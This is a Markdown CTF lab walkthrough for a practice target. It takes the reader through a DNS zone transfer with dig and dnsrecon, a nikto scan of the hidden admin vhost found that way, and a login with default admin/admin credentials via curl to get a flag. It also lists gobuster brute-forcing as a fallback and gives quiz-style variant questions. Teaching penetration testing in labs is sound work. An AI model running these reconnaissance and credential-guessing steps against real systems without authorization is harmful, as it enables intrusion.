# Scenario 29 — DNS zone transfer exposes admin panel

**Difficulty:** 🟡 | **Time:** ~25 min | **Domains:** 01, 02, 13, 14
**Tools:** [dig](../../tools/dig.md), [dnsrecon](../../tools/dnsrecon.md), [nmap](../../tools/nmap.md), [nikto](../../tools/nikto.md)

## Story
Target domain `megacorp.htb`, DNS server at 10.10.10.29. Pull the zone, discover an internal subdomain, and retrieve the admin flag.

## Step 1 — Identify the NS
```bash
dig NS megacorp.htb @10.10.10.29
```
**Expected finding:** `ns1.megacorp.htb`.
**→ Tool ref:** [dig record types](../../tools/dig.md#record-types)

## Step 2 — Attempt AXFR
```bash
dig axfr megacorp.htb @10.10.10.29
```
**Expected finding:** Full zone listing — look for `admin`, `dev`, `internal`, `staging`, `jenkins` subdomains.

## Step 3 — Alternative: dnsrecon
```bash
dnsrecon -d megacorp.htb -n 10.10.10.29 -t axfr
```
**→ Tool ref:** [dnsrecon axfr](../../tools/dnsrecon.md#axfr)

## Step 4 — Add subdomain to /etc/hosts
```bash
echo "10.10.10.29 admin.megacorp.htb" | sudo tee -a /etc/hosts
```

## Step 5 — Probe the hidden vhost
```bash
curl -I http://admin.megacorp.htb/
nikto -h http://admin.megacorp.htb/
```
**Expected finding:** Admin login page, default creds, or known CMS CVE.

## Step 6 — Exploit default credentials
```bash
curl -X POST http://admin.megacorp.htb/login \
  -d "user=admin&pass=admin" -c jar.txt -L
curl -b jar.txt http://admin.megacorp.htb/dashboard
```
**Expected finding:** flag on the dashboard.

## Step 7 — Final answer
**Answer format:** flag string / the hidden subdomain name, depending on question.

## Gotchas across this chain
- AXFR usually disabled on real DNS — if it works the pentest path is intended.
- Some nameservers return only SOA — try querying each NS listed.
- Subdomain must resolve: even after AXFR, you need the host-header vhost match — check by curl with `-H "Host: admin.megacorp.htb"` directly on the web IP.
- If AXFR fails, fall back to subdomain brute force: `gobuster dns -d megacorp.htb -w subdomains.txt`.

## Variant questions this scenario teaches
- "How many records are in the megacorp.htb zone?"
- "What is the IP of the admin subdomain?"
- "What is the SOA serial number?"

